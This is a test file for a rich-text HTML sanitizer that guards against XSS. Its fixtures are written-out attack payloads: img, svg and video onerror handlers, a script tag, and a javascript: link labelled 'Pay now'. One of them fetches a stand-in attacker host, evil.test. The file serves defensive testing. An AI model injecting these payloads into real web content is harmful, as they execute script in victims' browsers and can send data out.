import { sanitizeRichTextHtml } from '@open-mercato/shared/lib/html/sanitizeRichText'

/**
 * `rich-text-html` is the one block type whose HTML is stored and rendered
 * verbatim. It shipped unsanitized on both the write and the render path, and
 * the compose page's clipboard helper parsed it into a detached <div>, which
 * fires onerror/onload on the app origin. These pin the payload classes.
 */
describe('rich text block sanitization', () => {
  const payloads: Array<[string, string]> = [
    ['img onerror', '<p>Hi</p><img src=x onerror="fetch(\'https://evil.test\')">'],
    ['svg img onerror', '<svg><img src=x onerror=alert(1)></svg>'],
    ['video onerror', '<video src=x onerror=alert(1)></video>'],
    ['script tag', '<script>alert(1)</script>'],
    ['javascript: href', '<a href="javascript:alert(document.domain)">Pay now</a>'],
  ]

  it.each(payloads)('strips active content from %s', (_name, payload) => {
    const out = sanitizeRichTextHtml(payload)
    expect(out).not.toMatch(/onerror|onload|javascript:|<script/i)
  })

  it('preserves the legitimate markup the PCA templates use', () => {
    const out = sanitizeRichTextHtml('<p><strong>Bold</strong> and <a href="https://example.com/x">a link</a>.</p>')
    expect(out).toContain('<strong>Bold</strong>')
    expect(out).toContain('href="https://example.com/x"')
  })
})
